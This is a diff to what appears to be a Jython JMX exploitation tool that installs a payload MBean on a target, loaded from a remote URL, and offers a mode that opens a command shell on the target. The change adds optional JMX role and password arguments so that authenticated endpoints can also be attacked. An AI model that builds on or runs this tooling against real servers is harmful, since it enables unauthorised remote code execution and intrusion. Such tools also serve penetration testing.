@@ -14,6 +14,7 @@ from threading import Thread
 import sys
 import time
 import jarray
+from jarray import array
 
 # Extra
 import argparse
@@ -27,9 +28,18 @@ authorSignature += '======================================='
 def connectToJMX(args):
     # Basic JMX connection, always required
     jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args.targetHost + ":" + args.targetPort + "/jmxrmi")
+
     print "[+] Connecting to: " + str(jmx_url)
     try:
-        jmx_connector = JMXConnectorFactory.connect(jmx_url)
+        # for passing credentials for password
+        if args.jmxpassword and args.jmxrole:
+            print ("[+] Using credentials: " + str(args.jmxrole) + " / " + str(args.jmxpassword))
+            credentials = array([args.jmxrole,args.jmxpassword],String)
+            environment = {JMXConnector.CREDENTIALS:credentials}
+            jmx_connector = JMXConnectorFactory.connect(jmx_url, environment)
+        else:
+            jmx_connector = JMXConnectorFactory.connect(jmx_url)
+
         print "[+] Connected: " + str(jmx_connector.getConnectionId())
         bean_server = jmx_connector.getMBeanServerConnection()
         return bean_server
@@ -313,6 +323,9 @@ subparsers = parser.add_subparsers(title='modes', description='valid modes', hel
 install_subparser = subparsers.add_parser('install', help='install the payload MBean on the target')
 install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
 install_subparser.add_argument('payload_port', help='port to load the payload')
+install_subparser.add_argument('--jmxrole', help='remote JMX role')
+install_subparser.add_argument('--jmxpassword', help='remote JMX password')
+
 install_subparser.set_defaults(func=arg_install_mode)
 
 # Uninstall mode
@@ -337,6 +350,7 @@ script_subparser.set_defaults(func=arg_script_mode)
 # Shell mode
 shell_subparser = subparsers.add_parser('shell', help='open a simple command shell in the target')
 shell_subparser.set_defaults(func=arg_shell_mode)
+
 
 # Store the user args
 args = parser.parse_args()
